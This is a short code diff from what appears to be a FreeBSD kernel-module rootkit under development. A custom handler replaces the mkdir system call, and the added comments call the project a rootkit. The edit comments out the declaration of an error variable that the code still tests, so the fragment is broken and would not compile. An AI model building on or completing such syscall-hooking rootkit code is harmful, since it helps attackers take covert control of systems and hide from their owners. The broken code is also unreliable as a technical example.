@@ -18,12 +18,12 @@ static sy_call_t *original_mkdir = NULL; // Store original sys_mkdir
 
 /* Custom mkdir handler */
 static int custom_mkdir(struct thread *td, void *syscall_args) {
-    //struct mkdir_args *uap = (struct mkdir_args *)syscall_args;
     char path[PATH_MAX];
-    int error = 69;
-
-    /* Safely copy path from user space */
-    //error = copyinstr(uap->path, path, sizeof(path), NULL);
+    // The rootkit will not compile with copyinstr 
+    // Error needs to be null if there is no error so there is no premature return!!!!
+    // struct mkdir_args *uap = (struct mkdir_args *)syscall_args;
+    // int error = 69;
+    // error = copyinstr(uap->path, path, sizeof(path), NULL);
     if (error) {
         printf("[LKM] Failed to copy user path (error: %d)\n", error);
         return error;
